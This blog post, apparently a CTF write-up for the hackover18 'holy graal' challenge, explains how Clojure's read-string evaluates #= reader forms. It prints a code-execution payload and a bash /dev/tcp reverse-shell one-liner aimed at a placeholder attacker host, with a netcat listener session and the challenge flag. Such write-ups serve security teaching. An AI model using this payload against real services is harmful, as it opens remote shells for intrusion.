---
layout: post
title: ctf 0x02 / holy graal [PWN]
category: ctf
tags: [ctf, writeup, clojure, shellraisers, hackover18, pwn, shell, interactive]
---
## Shellraisers and the Holy Graal


> Everybody keeps talking about this new JIT. I think it is more secure, wouldn't you agree?
>   
> compiled with: native-image -H:+ReportUnsupportedElementsAtRuntime

We get the [main.clj](/files/ctf_0x02/main.clj) file, which is a Clojure script! Oh boy, that's another language I had nothing to do with (and neither had anyone from our team as far as I know). That does, however, explain the challenge title! "holy graal", since it's probably running on the [Graal VM](https://www.graalvm.org/). Okay, but back to the topic.

<!--more-->

Other than the script, we get access to a host that exposes something like an interactive shell:


```
Welcome to HolyGraal version 1.0.0-rc1
Everybody knows that keeping track of brackets is hard in LISP languages.
We now introduce: verify brackets as a service.
1: Send string
2: Exit
1
()
Good job, you know how to balance brackets. Now go, get the flag.
1: Send string
2: Exit
1
((())
You need to work on your balancing skills.
1: Send string
2: Exit
```

Hm... since it's a Lisp-like language, how is the bracket balance actually verified? Let's take a look at the code:

```clojure
(defmulti option identity)
(defmethod option "1" [_]
  (try
    (-> (read-line)
        (read-string))
    (println "Good job, you know how to balance brackets. Now go, get the flag.")
    (catch Exception e
      (println "You need to work on your balancing skills."))))
```

Okay, sooo... that reads a line and then... wait, what the hell is `read-string`? Let's check the docs:

> Reads one object from the string s. Optionally include reader
options, as specified in read.

Hey, that's pretty cool! You know what's even *more* cool? The next line:

>  Note that read-string can execute code (controlled by *read-eval*),
and as such should be used only with trusted sources.

Now we're talking! I've actually done a decent amount of information digging (also known as Google searching), that resulted in me findings [this discussion](https://groups.google.com/forum/#!topic/clojure/YBkUaIaRaow/discussion). It shows a simple PoC for an RCE payload via `read-string`:

```clojure
user=> (read-string "#=(clojure.java.shell/sh \"echo\" \"hi\")") 
{:exit 0, :out "hi\n", :err ""}
```

We don't get our output back in the challenge, but this isn't exactly a problem, is it? At this point I grabbed a couple of revshell ideas I had from [ub3rsec's cheatsheet](https://ub3rsec.github.io/pages/rev-shell-cheatsheet.html) and from [pentest monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) for Java (as Clojure is JVM-based) and mixed them with the PoC above to get this:

```clojure
#=(clojure.java.shell/sh "/bin/bash" "-c" "exec 5<>/dev/tcp/attackerip/attackerport;cat <&5 | while read line; do $line 2>&5 >&5; done")
```

Then I just ran the listener on my box, dropped the payload and waited for the session to call home. After it connected I read the `flag.txt` file and got the flag:

```
$ nc -nlvp 31337
Listening on [0.0.0.0] (family 0, port 31337)
Connection from [188.166.163.88] port 31337 [tcp/*] accepted (family 2, sport 41364)
ls
flag.txt
holy_graal-1.3.3.7-standalone
cat flag.txt
hackover18{n3v3r_tru5s7_u53r_1npu7}
```

**Flag:** `hackover18{n3v3r_tru5s7_u53r_1npu7}`

Can't deny, I enjoyed that one ;-)

Cheers!
